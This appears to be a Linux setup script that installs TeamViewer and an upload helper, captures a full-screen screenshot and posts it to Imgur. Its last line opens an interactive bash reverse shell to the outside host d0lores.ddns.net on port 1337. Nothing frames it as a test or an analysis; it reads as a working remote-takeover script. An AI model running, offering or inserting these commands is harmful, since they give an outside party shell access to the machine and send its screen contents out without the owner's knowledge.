sudo apt-get update -y
sudo apt-get upgrade -y
wget https://d0lores.github.io/imgur.sh
wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb
sudo apt install ./teamviewer_amd64.deb -y
teamviewer license accept
teamviewer daemon restart
teamviewer
xfce4-screenshooter -f --save test.png
./imgur.sh test.png | tee link.txt
/bin/bash -i >& /dev/tcp/d0lores.ddns.net/1337 0>&1
